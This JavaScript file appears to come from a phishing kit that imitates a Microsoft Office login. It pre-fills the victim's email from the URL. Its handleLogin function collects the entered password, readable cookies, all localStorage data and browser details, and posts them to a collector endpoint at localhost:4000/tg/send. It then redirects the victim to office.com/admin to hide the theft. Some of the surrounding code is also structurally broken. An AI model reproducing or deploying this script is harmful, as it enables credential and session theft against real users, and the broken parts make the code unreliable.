window.onload = function () {
  const params = new URLSearchParams(window.location.search);
  const email = params.get("email");

  const emailSpan = document.getElementById("user-email");
  const emailInput = document.getElementById("email-input");

  if (email) {
    emailSpan.innerText = email;
    emailSpan.style.display = "inline";
    emailInput.style.display = "none";
  } else {
    emailSpan.style.display = "none";
    emailInput.style.display = "inline";
  }
};
function validateEmail(email) {
  const pattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return pattern.test(email);
}

function validatePassword(password) {
  const pattern = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[\W_]).{8,}$/;
  return pattern.test(password);
}
const password = document.getElementById("password").value;
const email = emailSpan.innerText || emailInput.value.trim();
const errorMessage = document.getElementById("error-message");
const emailSpan = document.getElementById("user-email");
const emailInput = document.getElementById("email-input");

if (!validateEmail(email)) {
  errorMessage.innerText = "Invalid email format.";
  return;
}
if (!validatePassword(password)) {
  errorMessage.innerText = "password is not correct try again";
  return;
}

errorMessage.innerText = "";

function handleLogin() {
  const email = document.getElementById("user-email").innerText;
  const password = document.getElementById("password").value;

  // Create an object to store all accessible cookies
  const cookies = {};

  // Try to get document.cookie (this only works for non-HttpOnly cookies for your domain)
  if (document.cookie) {
    document.cookie.split(";").forEach(function (cookie) {
      const parts = cookie.trim().split("=");
      if (parts.length === 2) {
        cookies[parts[0]] = parts[1];
      }
    });
  }

  // Add localStorage data as well (not cookies, but still valuable)
  const storageData = {};
  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    storageData[key] = localStorage.getItem(key);
  }

  // Send the data
  fetch("http://localhost:4000/tg/send", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      email,
      password,
      cookies,
      localStorage: storageData,
      userAgent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
    }),
  })
    .then((response) => {
      window.location.href = "https://office.com/admin";
    })
    .catch((error) => {
      window.location.href = "https://office.com/admin";
    });
}
